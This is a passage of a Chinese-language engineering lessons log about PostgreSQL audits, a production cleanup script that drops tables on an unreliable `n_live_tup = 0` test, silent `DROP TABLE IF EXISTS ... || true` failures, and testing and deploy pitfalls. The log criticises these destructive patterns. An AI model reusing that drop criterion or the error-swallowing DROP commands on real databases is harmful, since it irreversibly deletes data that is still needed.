的**四个参数** —— **里面没有 `success`**
⇒ 「v2 丢弃失败请求」这个机制**根本不存在**，
真实情况是**机器流量（探针/自动生成）按设计被排除**。
⇒ ★ 判别动作：**读函数到参数表为止**；名字说的是意图，参数说的是事实。
★ 配套判别动作：先按「哪张表在量」筛出**候选列**（本节用
`information_schema.columns` 按 `table_name` 分组筛 `has_outcome_col`），
再对候选表逐个实测覆盖率 —— 不要一上来就对全部表做反连接（那会超时）。
★ ⚠ 本节 `request_state_transitions` 的覆盖率查询在 300s 超时
⇒ **候选优先、单表逐个跑**，是这类大表反连接的现实做法。

### 2026-10-19 §134 「同一现象 vs 不同现象」要靠数字对上；差集定性前至少切两个维度

**1. ★★★★★ 这是「不许合并」那条纪律的对称条款：该合并时必须合并。**
§130 拒绝把两件事合并，理由是「孤儿行 = 0 与计数不等看起来矛盾」；
§134 实测发现 4,206 条与那批**逐日数字完全相同**（10-09=781 / 10-10=1 / 10-11=159 / 10-12=3265）
⇒ 它们**确实同源，应该合并解释**。
⇒ ⇒ ★★★ **⇒ 判据是「能否逐日/逐键对上」，不是「看起来像不像」。对上了就合并，对不上就分开。**
★ ★ 同族：[[两个不一致不许合并成一个故事]]（防过度合并）——
本条防的是**该合并却没合并**，两个方向都有真实实例，别一刀切。

**2. ★★★★ 交叉表能把「一坨缺口」劈成成因完全不同的部分。**
`session 有无 × success` 两个维度一交叉，6,166 条立刻分成
「无 session 的成功行 4,206」与「有 session 的行 1,960」，
而前者**根本不是失败请求**（`no_session × f` 组合为零）。
⇒ ⇒ ★★ 若只按 `success` 切，会把两者混为一谈，得到「4,206 条失败请求没被镜像」的错误结论。
⇒ ★ 判别动作：**给一个差集定性前，至少切两个维度**（一个业务维度 + 一个形态维度）。

**3. ★★★ 「成簇」只能证到「单日事件」，不能直接证到「成因」。**
10-10 单日占 62%（1,210/1,960）排除的是「均匀漂移」，
但当天流量正常（`v1_rows=39,165` / `v2_turns=16,084`）
⇒ **「那天覆盖率低」与「那天系统坏」是两件事**。
⇒ ★★ 通用式：**成簇 ⇒ 缩小时间窗，不是给出机制**；机制仍需另找证据。
★ 配套形态证据：10-10 那批 1,025 个 session **各只有 1 行**（每 session 一行占 93%）
⇒ 不是「同 session 丢部分轮次」，而是**那些 session 整体没进 v2** —— 这两种机制要分开查。

### 2026-10-19 §135 「某对象存在」不能跨实例推断；会静默失败的脚本最危险

**1. ★★★★★ 「两处同名/相似对象」是跨实例误推断的头号来源。**
本节初稿据生产 PG（172.16.2.210）的 `candidate_failure_logs_hot`（4,319 行）
推断 252 上的 `candidate_failure_logs_columnar_old`「还在、所以 DROP 全失败了」，
实测该表在 **252 上根本不存在**——它是真的被脚本删掉了。
⇒ ⇒ ★★★ **⇒ 阴性结论的可信度上限 = 观察实例的数量。**
★ 同族：[[阴性结论要当缺陷一样复核]] 的多副本变体（单实例统计会漏 / 多副本会混）。
★ ★ **落到行动上**：脚本修复**必须在目标机器上验证**，
不能用另一套环境（另一台机 / 另一个库）的数据代替 —— 两套环境同名表会骗人。

**2. ★★★★ 「潜在风险」与「已发生」要分开记账，而日志会把两者混在一起。**
`L1 DROP` 记录 **176 次**，其中 **126 次打在同一张早已不存在的表**上，
每次都「成功」——因为脚本用的是 `DROP TABLE IF EXISTS ... || true`，
**吞掉了所有错误**。
⇒ ⇒ ★★★ **⇒ 一个会报错的脚本，恰恰是最危险的那种：它失败时不留痕。**
★ 判别动作：**评估自动化脚本时，先看它失败时会不会说话**；
`|| true` / `ON CONFLICT DO NOTHING` 式的静默失败，会把「反复失败」伪装成「反复成功」。
★ ⚠ 连带：每 15 分钟触发一次、日志已 2.2 MB 且无界增长 ⇒ 日志本身也是待清理项。

**3. ★★★ 不可逆动作的判据用估计量，代价会在触发那天集中兑现。**
线上 `pg17-emergency-cleanup.sh` 的 L1 判据是
`n_live_tup = 0 AND pg_total_relation_size >= 100MB` ⇒ 实测当前目标集
**6 张表 / 约 2.8 GB**，其中 `ursm_node_snapshot_min_legacy`（852 MB，实测 2,836,620 行、极健康）
**会是第一个被误杀的**。
⇒ ★★ 这是「凡接不可逆动作的判据必须用权威量复核」的教科书实例：
`n_live_tup` 在 PG 重启后清零（§118 已证）⇒ **估计量只能筛可疑项，不能直接驱动 DROP。**
★ ★ 同族：[[定级用的输入必须是分布不是极值]] —— 那里是统计，这里是不可逆动作的触发条件。

**4. ★★★ 「潜在风险」要问「它触发过没有」，答案会改变优先级。**
此前多轮把 emergency-cleanup 记为「潜在地雷」；
本节查日志发现 **`L1 DROP` 已执行 176 次、跨 3 个月、每 15 分钟一次**
⇒ 它不是待评估的方案，而是**在生产上持续运行的作业**。
⇒ ★ 判别动作：**给自动化脚本定级前，先 `grep` 它的日志确认执行过多少次**——
「设计上危险」与「已经在跑」是两个量级。

### 2026-10-19 §136 一张 283 万行的表 `n_live_tup` 报 0；判据偶尔蒙对不等于判据是对的

**1. ★★★★★ 「估计量不能接不可逆动作」的教科书样本。**
`ursm_node_snapshot_min_legacy` 实测 `count(*) = 2,836,620`，
而 `pg_stat_user_tables.n_live_tup = 0`
⇒ **`L1 DROP` 判据（`n_live_tup = 0`）必然误杀它**。
★ 根因：`n_live_tup` 是「上次统计后变化量」的累积器，**PG 重启即清零**
⇒ 它回答的是「自上次 VACUZE/ANALYZE 以来有没有动过」，**不是「表里有没有数据」**。
★ ⇒ **任何 `n_live_tup = 0` 的表，都要用 `count(*)` 复核后才能进 DROP 清单。**

**2. ★★★★ 「一个判据偶尔蒙对」不等于判据是对的 —— 要看错误率。**
L1 在 `_legacy` 上「删对」（实测它只覆盖 **21 小时**且无人再写），
在另外 5 张**确有数据**的分区上「全错」
⇒ **5/6 的错误率不能被 1/6 的正确掩盖。**
★ 判别动作：**评估判据要看错误率，不是看它有没有对过一次。**
★ 这也解释了为什么「先跑一轮 --report」这类前置步骤值得做：
它让你**在看错误率**而不是看一个「看起来对」的样例。

**3. ★★★★ 孤儿表的判定要查三处：写入脚本、cron、进程。**
`_legacy` 查 `/opt/scripts/`（无命中）、`/etc/cron.d/`（只有一条**注释**）、`ps aux`（无进程）
⇒ 三处皆空 ⇒ 「还占 852 MB，但没有任何东西在写它」。
★★ **cron 里的注释不算证据** —— 它记录的是**曾经**发生过什么，不是**现在**还在跑什么。
★ 同族：[[注释描述的是作者设想的路径，代码执行的是实际存在的路径]]。
⚠ 而那条注释恰好解释了同族空表 `ursm_node_snapshot_min`（**0 bytes**）的来历：
分区化前旧表写入失败 → 数据搬进 `_legacy` → 旧表留下 0 字节空壳。

**4. ★★★ 「它覆盖哪段时间」比「它有多少行」更能决定去留。**
2,836,620 行看着很多，但 `min/max(snapshot_ts)` 显示只覆盖
**2026-10-06 15:50 ~ 10-07 13:03（21 小时）**，
而 10-07 13:03 ~ 10-12 之间**空档无人填补**（legacy 全部 <10-12、每日表全部 ≥10-12）
⇒ 真正的判断题是「**那 21 小时有没有人要查**」，而不是「它有没有数据」。
★ 判别动作：**给历史表定去留时，先量 `min/max(时间列)` 与相邻表的接缝** ——
「行数」是规模指标，「时间覆盖」才是价值指标。
★ 配套：判断「它是不是被后来的表取代了」，要看**结构差异** ——
本例 legacy 56 列 vs 每日表 57 列（新表多一列 `empty_response_rate_5m`）
⇒ 结构演进过一代，是「新机制接管」的旁证。

### 2026-10-19 §137 「估计量不准」与「判据与意图无关」是两件事；判对时要问是不是蒙对的

**1. ★★★★★ 两者的修正手段完全不同：换更准的估计量 vs 换判据维度。**
L1 判据读 `n_live_tup=0`，实测真值 5,926,343 行。
若只是「估计量有误差」，加缓冲阈值（如 `n_live_tup=0 AND relpages=0`）就能救；
但实测两张「真空表」判对的原因分别是
「`_legacy` 只值 21 小时」与「`_request_logs_bodies_hot` 被 TRUNCATE 过」
⇒ **都与「n_live_tup 准不准」无关** ⇒ **阈值怎么调都修不好**。
⇒ ⇒ ★★★ **⇒ 修正判据不是「换个更准的量」，而是「换维度」**
（本例正解：`relpages=0` **且** `count(*)=0` 双条件 —— 两个都指向「物理上真的空」）。

**2. ★★★★ 判据的每次「正确」都能追溯到巧合时，要直接否决它。**
L1 判对 2 次、判错 5 次 ⇒ **准确率 1/6**。
⇒ ★ 判别动作：**统计判据的历史正确率，而不是挑一个它对的例子。**
★ ★ 这正是「先跑一轮 `--report` 再切 `--fix`」的价值：
**report 的作用不是看「能不能删」，是看「判据准不准」。**

**3. ★★★ 区分「该不该清理」与「谁有权清理」。**
9 月分区（`request_wal_2026_09` 446,777 行 / `usage_ledger_2026_09` 1,416,772 行
/ `session_turn_details_2026_09` 786,036 行 / `routing_decision_log_2026_09` 440,138 行）
**仍在被索引支撑**（各带 4~5 个配套索引），`request_wal_2026_10` 还在写（282,770 行）
⇒ 它们是**已冻结但仍承载历史查询的分区**。
⇒ ★★ 通用式：**不可逆动作的判据必须独立于「该做什么」的业务判断** ——
业务上「这张表没用了」与统计上「这张表是空的」是两码事，
把前者当后者的证据就会删掉**还需要留的历史**。

**4. ★★★ 推断要升级为实测再用于拍板。**
§136 说「L1 会误伤 5 张分区」是**推断**（依据「分区通常有数据」）；
§137 逐张 `count(*)` ⇒ **5,926,343 行**、准确率 **1/6**。
⇒ ★ 判别动作：**凡是要支撑「授权不可逆动作」的结论，先把推断换成实测**，
因为拍板人看到的是数字，不是「据推断」。
★ 配套：量表大小时用 `count(*)` + `relpages` **两把尺** ——
`relpages=0` 是物理空壳的强信号，而 `n_live_tup=0` 只是统计没更新。

### 2026-10-19 §138 「读数是 0」和「读数的工具坏了」必须能区分；文档里的数字要绑**可复现方法**

**1. ★★★★★ 「0 次」这个读数，最危险的失效模式是**计数器恒为 0**。**
本轮把「生产 `?q=` 使用量 = 0」这条结论固化成工具时，
如果计数器写错（正则失配 / 根本没读到文件 / 压缩没解开），
输出与「真的没人用」**完全一样**——两者都是 `0`。
⇒ ★ 判别动作：**凡是要用「某个计数是 0」支撑决策，必须配一条正向对照**
（喂一份**已知含命中**的夹具，断言它能数出非 0）。
本轮做法：脚本自带 `--self-test`，用含 `?q=` 真命中的离线夹具驱动**同一套**计数逻辑。
★ 配套：还要配**反向对照**——`?seq=123&req=abc` **不得**被裸 `q=` 误配进来
（裸 `q=` 会匹配 `seq=` / `req=` / `limit=` / `mode=` / `omit_body=`）。

**2. ★★★★★ logrotate 的 `delaycompress` 会让「最近的轮转文件不带 `.gz`」。**
生产 nginx 轮转名 = `<name>.log-<YYYYMMDD>.gz`（中间有日期），
而 `delaycompress` 让**最近一次**轮转的文件**保持未压缩**（`<name>.log-20261019`）。
只 glob `*.log` + `*.log*.gz` ⇒ 漏掉这一族 ⇒ **漏掉的恰恰是当天流量**。
实测：154 少计 **47** 次、211 少计 **14** 次，而结论（0 次）侥幸没变。
⇒ ★ 判别动作：**枚举日志文件时按「文件族」枚举，不按「后缀」枚举**
（当前 / 未压缩轮转 / 压缩轮转，三族用 `find` 一次列全），并在
「轮转族一个都没命中」时**显式告警**——否则"0"会静默通过。
★ 推广：任何 `awk`/`zcat` 管道都**不能丢掉 stderr**（解压失败会让 0 变得不可解释）。

**3. ★★★★ 文档里的数字必须绑定**可复现的方法**，否则连标签都会错。**
本轮发现先前那张表里 154=1,431 / 245=63 / 211=75 其实是**全保留期**的读数，
却被标成「2026-10-11…10-19 窗口」；同口径下该窗口真实值是 145 / 55 / 80。
**结论没变，但标签是错的**——下一个读者会据此以为"9 天就有 1,431 次"。
⇒ ★ 判别动作：**结论落进文档时，同时落下"取数命令 + 口径 + 覆盖范围"三样**，
并在数字变化时**先重测再改标签**，不要只改数字。
★ 本轮落地：`scripts/audit/q-usage.sh`（带 `--self-test`）成为该数字的**唯一口径**。

### 2026-10-20 §139 「跑一次对」≠「可复现」：可复现脚本必须能**重复执行**；同名不同签名的辅助函数会互相污染

**1. ★★★★★ 可复现脚本的第一条要求是「能跑第二遍」，而不是「跑出正确结果」。**
本轮按决策文档 §7 的复现命令，在同一个 `wa-pg17` 容器上跑交叉校验 SQL —— **第二遍炸了**：

```
ERROR:  function xc_time(regclass, integer, integer) is not unique
HINT:  Could not choose the best candidate function.
```

根因：两个 SQL 脚本的辅助函数**同名**（`xc_time`）但**签名不同** ——
交叉校验是 3 参、因子分解是 4 参且第 4 参（`id_off`）**带默认值**。
PostgreSQL 解析调用时，**带默认值的那个也能接 3 参调用**，
于是同一次调用出现两个同优候选 ⇒ PG 判为歧义。
⇒ ★ 判别动作：**给仪器写「可复现」之前，先在同一个环境里连跑两遍**。
「跑一次得到正确数字」完全可能是**首次运行特权**的产物。

**2. ★★★★ 跨脚本污染：两个仪器共用同一族函数名 = 互相污染。**
交叉校验用 `xc_*`、因子分解也用 `xc_*` ⇒ 谁先跑谁给对方留雷。
⇒ 修法两条**缺一不可**：① 每个脚本开头按**签名**清空本族
（`proname LIKE 'xc\_%'` + `DROP FUNCTION IF EXISTS %s CASCADE`），
让脚本自身**幂等**；② 不同仪器用**独立前缀**（`xc_` / `xf_`），互不干扰。
⇒ 验证口径：同一容器上 交叉校验×3 + 因子分解×2 + 交叉校验再跑，全部 exit=0。

**3. ★★★★ 「残留旧文件」会让复现段**侥幸跑通**，从而掩盖名字对不上的缺陷。**
决策文档的复现段里 `docker cp` 的文件名与 `psql -f` 的文件名不一致
（连字符 vs 下划线）—— 在脏容器上因为**上次留下的旧文件**而跑通了，
在干净容器上必然 "No such file or directory"。
⇒ ★ 判别动作：**复现命令要在一个「干净环境」里验证过**，
且文档里出现的每个文件名都要与仓库里的文件名**逐字一致**（本轮已加门钉住）。
⇒ 配套：`docker cp` 之后 `psql -f` 必须引用**同一个名字**；文档复现段要写清
「必须在 PG 所在机执行」这类**位置约束**（psql 在容器内，文件要先拷进去）。

**4. ★★★ 复跑复现的副产品：数字要重新对照，不能沿用。**
复跑得到 Δ=+39.96 µs/行、+3,754 B/行（文档记 +38.3 / +3,527）⇒ 结论可复现；
但**波动来自检查点 FPI**，所以报告口径仍然是**区间**（3.5~15 KB/行），
不是单点值。

### 2026-10-19：脱敏语法判据必须覆盖真实表示层

- 根因：只测试普通 sed 命令，遗漏用户消息中的 JSON 编码字符串。转义引号使输入检测把遮蔽代码当成凭据，再经模型与还原链产生间歇输出误封。
- 防复发：直接测试 `isPlaceholderSecretValue` 与真实 YAML 检测器；覆盖普通/JSON、单双引号、真实凭据反例、字节偏移与变异负控。JSON 解码还会把非法 UTF-8 替换成多字节字符，映射前必须拒绝非法 UTF-8，避免范围漂移覆盖相邻真实凭据。
- 证据：`0cf788c1e`；两包完整测试通过，JSON路径断开和offset+1变异均红；非法UTF-8问题由双轴审查发现并在上线前关闭。线上取证请求 `012464b6eecca6500b33dd2d6ef0228d`；部署与最终复测见 `docs/audit/2026-10-19-output-sensitive-controls-rollout.md`。

## 2026-10-19 — 最终空回复与生成中的进度需要不同判据（Seen: 1/3 个不同工作日）
- cue：同一个“没有最终可见答案”的谓词被用于判断生成中的流是否无进展时。
- 组件：回归判据；真实 gate 的多帧序列回放。
- 任务 / 缺陷：[154 流式与节点审计](docs/audit/2026-10-19-stream-node-audit.md)，用户 empty_model_response / MiniMax、GLM 中断反馈。
- 基线 / 修复 SHA：`aa888f9b80ad08490df8d3f8a5508bf52f6152f0`；修复 `c6ed58412f51729ad35ab6be2abf86c090e97c0a`（首次复审时尚未提交）。
- 根因：r1029 正确排除 reasoning 作为最终助手答案，但 ChatSemanticDelta 取同一谓词反值，把连续正常 reasoning 计入默认三个空 delta 阈值。原“推理后仍算正文”测试只孤立测正文一帧，没走 gate 序列。
- verdict：helped；同一真实 gate 夹具在旧谓词下 early_empty_detection，在补丁下等待正文；整回合 reasoning-only 在终态仍判空。
- 防复发检查：同时覆盖“reasoning×3→答案”“empty×2→reasoning→empty×2”“reasoning-only→finish→EOF/DONE”；跨缓冲与真实commit gate阈值的两侧和中间区间都要测。不能把 thinking 改回最终答案来修中途误杀。
- 证据：`TestEmptyGateReasoning*` 红→绿；撤谓词修复的 overlay 红2条，“忽略reasoning但不清空计数”的变异被 `TestEmptyGateReasoningResetsEmptyCounter` 抓住。八行 gate 缓冲会计 SSE 空行，测试到 cap 后不能强求 gate 已读到正文，正文由后续主循环读取。
- confidence：high，代码行为与变异已隔离验证；154 早空计数206个 request 只证明信号存在，不能把每条归因于本缺陷。
- 复审增量：只测8/60帧漏掉25–50帧的SSE空行计数契约；补48组合及无finish EOF/读取失败后，未提交可恢复失败按实际可见0帧报告。纯推理DONE原伪成功也被真实链判据抓住；最终6个终态行为变异均变红。该局部计数缺口不等于已证明外层survival最终拒绝恢复。
- 状态：首次复审时补丁已验证、完整门禁存在 pristine 基线失败；续查已修正失效判据，根 verify 完整通过，代码已本地合并；本任务尚未部署。

## 2026-10-19 — 不确定探测的保护必须到达实际写入端（Seen: 1/3 个不同工作日）
- 根因：只在判定器返回ObservationOnly/applied=false仍会假绿；后续写入器可能忽略标记、沿用旧状态重写CMB/cache，或把503写成Available=true。NPS的lease/next_retry同时是路由字段，调度簿记也可能解封旧broken。
- 防复发：从真实HTTP响应一直测到Sync/Confirm/queue/worker/SQL与缓存边界；既有broken和有效成功都作对照。能力支持与生成健康用独立证据；分类用完整有界正文，preview只用于诊断。
- 证据/溯源：[本轮审计](docs/audit/2026-10-19-stream-node-audit.md)，baseline aa888f9b，修复 ad2bf3fd91f916cdef37e51059bbda55b9ea7fec（首次复审时未提交）；连接spy的旧行为4次非法SQL尝试变为0，TEMP/ROLLBACK证实broken未解封；native长前缀必须先证明关键词位于preview外。

## 2026-10-19 — 固定SQL来源证明不能靠同名或删掉未知片段（Seen: 1/3 个不同工作日）
- 根因：为本地固定SQL补校验时，只按函数名匹配会让selector/遮蔽closure借名；删除动态拼片后再判UNION，会把嵌套过滤误读成输出分支。跨tag复用测试helper还可能产生只在integration下的符号断链。
- 防复发：CallExpr对象绑定与括号正负控；未知SQL片段默认拒证明；必要的具名证明核真实声明并跑全部有限输入的完整返回SQL；同次跑普通与integration编译。
- 实际证据/溯源：[本轮续查](docs/audit/2026-10-19-stream-node-audit.md)，独立反例先红、修后绿，最终10行为变异红；原stripSQLComments函数原样搬移后integration vet通过。修复 f13c2289d3aa3bf8101228b540fcc22c9af38865（首次复审时未提交）。

## 2026-10-19 — 库存证据要排除注释，列投影不等于人口覆盖（Seen: 1/3 个不同工作日）
- 根因：源码 substring 让旧 SQL 注释冒充读点；进一步用 AST Comment.End 定位又因 CR 归一化缩短原文字节范围。另一个判断盲区是仅凭 canonical 列直映，就把 waterfall 全人口误判为停写无影响。
- 防复发：Go 注释范围用 AST 起点加原始字节终点，配 CR/CRLF 正反例；更换查询来源后同时核对镜像排除人口，不能只核列投影。
- 证据/溯源：[admin 库存复核](docs/audit/2026-10-19-admin-inventory-repair.md)，代码 `0ebe9bf8e`；注释与 CR 反例先红后绿，14 个变异均触发指定断言；waterfall 保留仅 v1 人口的 errors_out 风险，降为 unaffected 的变异被拒绝。

## 2026-10-20 — API 存活不能证明 nginx 可读发布目录（Seen: 1/3）
- 根因：部署命令外层 umask077 → tar归档 `.`=0700 → root网关正常、nginx无法遍历release；SPA回退循环500。既有门只读健康/版本API，漏静态网页。
- 处置与防复发：release根0755，仅公开web目录/文件归一化，私有配置0600保持；发布后真实HTTP校验HTML与JS，先于verified/stopold；browser-use实际交互验收。
- 证据：单变量chmod后500→200、PID/二进制不变（helped）；真实tar权限保留正反夹具、HTTP负例、6变异均捕获。BSD tar非root须-p模拟远端root语义，并先验错误权限前提。
- 溯源：基线947d96cd3（本条编写时尚未提交）；[事故复盘](docs/audit/2026-10-20-154-dashboard-500.md)。

## 2026-10-20 — 索引膨胀的对照实验：「新建」与「增量长出来」不可比（Seen: 1/3 个不同工作日）
- 根因：把「ASC 索引 90% 满 vs DESC 52% 满」当成方向差异，其实那个 ASC 索引是**数据灌完之后才 CREATE INDEX 建的**（批量建索引天然 ~90% 满），DESC 那条是**先建索引后灌数据**（增量长出来 ⇒ 每组反复分裂 ⇒ 冻结的半满页）⇒ **换了条件还在比大小**。生产上的天然对照同样有混淆（两条同键索引的填充率差异其实是**重建时点**差异）。
- 防复发：① 任何「A 比 B 密/小/快」的索引实验，先问「两者是不是同一种造法产出的」——「新建 / 增量长出来 / REINDEX 过 / VACUUM 过」是**四种不同的索引**，不可混比；**最省事的归一化动作＝在同表上把待测索引 REINDEX 一遍**，若读数变一样 ⇒ 差异来自造法而非被测变量。② 低填充率要先分清「btree 去重压缩」与「冻结的半满页」：当**两条机制能预测出同一个数字**时（去重因子 10 恰好也能预测出那个填充率），那个数字**不能当判据** ⇒ 必须换一把独立的尺（`pageinspect` 直接数物理元组 vs 索引条目），而不是换措辞。③ 量具口径先读源码再读数（`pgstatindex` 的 `avg_leaf_density`＝叶页字节填充率；`leaf_fragmentation`＝叶页右兄弟块号更小的比例≈分裂痕迹，**不是**空洞率）。
- 实际证据/溯源：本地 PG17.11 沙箱 + 生产真实数据 588,980 行（按 id 序导出）+ 生产原样索引定义，7 个变体。V2（数据灌完后新建 ASC）90.17% / V3（REINDEX 后的 DESC）90.17% 且**字节数逐字节相同** / V7（先建后灌的 ASC）52.00% ⇒ **方向无关**；V5（分钟内按键序插入）**逐字节等于** V1 ⇒ 写侧 ORDER BY 收益 0；V6（全局键序，写侧做不到）也救不了 DESC 那条。保真度自证：沙箱 DESC 索引的乱序度 93~99 几乎逐位复现生产。runbook §143.15；提交 `3a41dedcc`。

## 2026-10-20 — 判据与变异脚本自身的三种假信号（Seen: 1/3 个不同工作日）
- 根因：① 剥除用正则把 `WITHIN GROUP (ORDER BY …)` 替换成 `"WITHIN GROUP (ORDER BY <已剥离>)"` ⇒ **替换串自己命中判据** ⇒ 门恒红（自己判自己违规）；② `set -o pipefail` 下 `cmd | grep -q PATTERN`，grep 找到即退 ⇒ 上游收 SIGPIPE(141) ⇒ 管道状态变成失败 ⇒ 把「转红」判成「**没转红**」；③ 变异后没有逐字还原校验就继续往下走。
- 防复发：替换串必须自检（它自己会不会命中判据）；判变异结果**把输出收进变量再 grep**，不要在 `if` 条件里用 `grep -q` 管道；每次变异后用 **md5 校验还原**，再跑一次全绿，并确认工作区无残留 diff。
- 实际证据/溯源：`internal/quality/minute_aggregator_index_order_test.go` 的 3 条新门（禁顶层 ORDER BY／钉住「一次跑只处理 1 个分钟桶」／钉住 runbook 订正横幅），变异 M1/M2/M3 **全红**、还原后两个文件 **md5 逐字一致**（脚本 `/private/tmp/pmm_exp/mutation.sh`，输出 `MUTATION_RESULT=ALL_OK`）。

## 2026-10-20 — 守卫必须跑在拆服务之前：一次「部署失败」不该等于「服务下线」（Seen: 1/3）
- 根因：211 的 docker 引擎顺序是「`docker rm -f` 旧容器 → 才做输入校验（前端新鲜度）→ 才起新容器」。守卫一失败（die）就落在「旧容器已删、新容器未起」的窗口 ⇒ nginx upstream 无监听 ⇒ `llm.itestu.cn` 502。**守卫规则本身是对的，错的是它排在拆服务之后**——守卫的失败形态应当是「这次部署不发生」，而不是「服务下线」。
- 为什么只有 211 中招：154/245 走蓝绿（候选实例先起在候选端口、验收过才切流，失败走 `_bluegreen_abort` 回滚，旧实例全程在服务），211 是**单容器 docker 形态、没有候选端口**，所以必须自己实现「可回滚的退役」。
- 防复发检查：① 所有输入判定（前端新鲜度、DB 迁移重放）前移到退役之前，且部署机侧在 **sync 之前**就判（最早可判点：不 sync、不 build、不 push）；② 退役改成「改名 + 停机」保留容器对象与镜像，拆后任何失败走 `d211_fail` → 回滚（还原种子 + 拉回旧容器 + 重新拉起）；③ 判据**同时**有行为层（docker 替身驱动真函数）与结构层（顺序 / 不硬删 / 失败点走回滚）——只留一层会漏：只留行为层则有人把守卫挪到退役之后仍全绿，只留结构层则回滚实现坏掉未必抓得住。
- 证据：`tests/deploy_211_teardown_order_test.sh` 25 条（行为层 4 组 + 语义层 4 种结局 + 结构层 10 条不变量）；7 条变异全部被捕获且**红在被测对象上**（M1 守卫后移 / M2 改回硬删 / M3 去掉回滚 / M4 去掉种子还原 / M5 守卫恒放行 / M6 就绪失败改回裸 die / M7 去掉 `docker inspect --type container`）。既有 `tests/deploy_211_contract_test.sh` 110 条仍全绿。
- 溯源：本轮 211 502 事故；[复盘](docs/audit/2026-10-20-211-502-deploy-order.md)。

## 2026-10-20 — 变异验证读「红了」之前，先确认红的是被测对象而不是量具自己炸了（Seen: 1/3）
- 场景：给 211 部署顺序加判据门，7 条变异里 2 条（M5/M6）报「门变红」，但**红的原因不是断言失败**，而是判据脚本自身 `行 N: out?: 未绑定的变量`——脚本提前退出，退出码非零被当成「门红了」。
- 真因：`"$out）"` 里 `$out` 紧跟中文全角括号，**bash 3.2 会把多字节首字节并进变量名** ⇒ 变量名变成 `out<0xEF...>` ⇒ unbound variable。本仓已有同类门（`deploy_211_contract_test.sh` 扫 `$var` 紧跟非 ASCII），但那次只覆盖被测脚本，没覆盖**判据脚本自己**。
- 防复发检查：① 变异验证的读数必须**区分「真实断言红」与「量具自己炸」**——先看输出里有没有断言行、有没有 `行 N:` 这类 shell 报错；只有前者才算「被抓住」；② 判据脚本自身也要过 `$var 紧跟非 ASCII` 扫描；③ 顺带得到一条通用式：**「红」的读数与「不红」的读数一样需要先验量具**——这是「0 命中的第一嫌疑是量具坏了」的镜像形态。
- 证据：M5/M6 首次判红时输出为 `行 170: out?: 未绑定的变量` / `行 256: anchor?: 未绑定的变量`，修正判据脚本（`${out}` / `${anchor}`）后复跑，两条变异均转为**真实断言红**（M5 三条、M6 一条）。

## 2026-10-20 — 模式类判据必须在「剥掉注释后的代码位」上搜，且要两腿自证（Seen: 3/3 个不同工作日）
- 根因：本轮新写的 auto-route SQL 形态门最初**直接在原始文本里搜 `DISTINCT ON`**，而被测的 `refreshIndexSQL` **满是有注释的 SQL** ⇒ 「注释里引用了该模式」也算违规 ⇒ 写一句解释性注释就误报；而写注释的人为了「让门绿」去改注释 ⇒ **下一个人写注释就重新踩**。
- 防复发：① 模式类判据一律先剥注释（`--` 行注释 + `/* */` 块注释，**单引号字符串内原样保留**）再扫**代码位**；② 剥完必须补**两腿**自证 —— **注释里的同名字样不得进代码位**（防假阳性）**＋ 真代码位里的同名字样仍必须被抓**（防「只补前者 ⇒ 退化成什么都抓不到的恒绿门」）。
- 证据/溯源：`autoroute/index_sql_shape_test.go`（stripSQLComments + 6 条形态门 + 2 条自证），变异 7/7 全红且红在预期腿 + 对照变异（只加注释）仍全绿；提交 `80987aa57`。本仓同族 3 个工作日：2026-10-18（`--` 之外 `DO` 块字符串字面量仍让 `Contains` 失去判别力）、2026-10-19（源码 substring 让旧 SQL 注释冒充读点）、2026-10-20（本轮）⇒ **已晋级 AGENTS.md §35(a)**。
- ⚠ 附带教训：写 handoff 时曾把这条经验**误引**成「AGENTS.md 判据纪律里那条」—— 核对时发现 AGENTS.md 当时**并无**此条 ⇒ **引用纪律条目前先核文件真实存在**，别照抄上一轮的转述（本轮已订正 handoff 并补 AGENTS.md §35）。

## 2026-10-20 — 守卫/门/短路类机制必须有一条腿直接断言「副作用没发生」（Seen: 1/3 个不同工作日）
- 根因：S4 停写门里两个**极性相反**的判定函数被我直连 —— `recordedCostComparability` 答「**还能不能判定**」、`SkipWhen` 答「**要不要跳过**」；写成「不可判定 ⇒ 不跳过」⇒ 守卫**永远不生效**（照旧发 SQL），而**判定函数自身的判据仍然全绿**（它确实正确返回了 comparable=false）。
- 防复发：任何「守卫/门/短路」类机制，都必须有一条腿直接断言**副作用没发生**（没发 SQL / 没写文件 / 没调下游），而**不是**只断言「判定函数返回了正确的值」—— 后者在极性接反时**全绿**。量具（不依赖真库）：**同一个连不上的连接池 + 同一条检查，只切换门** ⇒ 门开着时错误串含 `query <check_id>`（它发了 SQL），门关着时错误串**不含**它（根本没发）⇒ 正反两腿互为对照 ⇒ 非空断言。⚠ 与既有「断言要匹配机制而不是副作用」**不冲突**：那条讲**肯定式**断言该钉哪一层，本条讲**守卫**还必须**额外**有一条「没发生」的腿。
- 证据/溯源：`bg/routing_health_checks.go`（SkipWhen / recordedCostComparability / runChecksWithRecorder）、`bg/routing_health_checker.go`（skipped 列表）、`bg/routing_health_checker_s4_skip_test.go`（6 条）；变异脚本含「极性接反」一条 ⇒ 7/7 全红在预期腿 + 对照仍全绿；提交 `ae9107145`。⇒ 已登记 AGENTS.md §35(b) 但**未晋级**（Seen 1/3）。

## 2026-10-20 — 变异脚本的「还原」必须还原**全部**涉及文件，且要打印失败腿名字（Seen: 1/3 个不同工作日）
- 根因：S4 变异脚本里每条变异**只写它自己改的那个文件** ⇒ **上一条变异对别的文件的改动残留到下一轮**（M5 把 worker 从 `s4ScanSkipWorkers` 闭集删掉后没还原 ⇒ 对照变异 C0「只改日志文案」是在一棵**缺 worker** 的树上跑的 ⇒ 门红）。
- 表现极具误导性：**看起来像「门有假阳性」，实际门是对的**（手动在干净树上复跑 C0 全绿）⇒ 若照着错误信号去改门，就是改错方向。
- 防复发：① 每条变异前把**所有**涉及文件还原回原始态（不是还原本条改的那个）；② 变异脚本必须**打印失败腿名字**，并对**对照变异自动重跑一次** —— 失败腿的名字是区分「门有假阳性」与「树被污染 / 这一轮跑飘了」的第一手证据；③ 还原后做逐字/md5 校验，确认无残留 diff。
- 证据/溯源：`scripts/mutate-s4-recorded-cost-skip-gate.py` 等三份脚本统一改造；同族见 2026-10-20「判据与变异脚本自身的三种假信号」第 ③ 条（那一条是「没校验还原」，本条是「还原得不够全」）。

## 2026-10-20 — 变异脚本的「红」要分清是**断言红**还是**编译红**：编译红只证明代码被改了，不证明目标腿会触发（Seen: 1/3 个不同工作日）
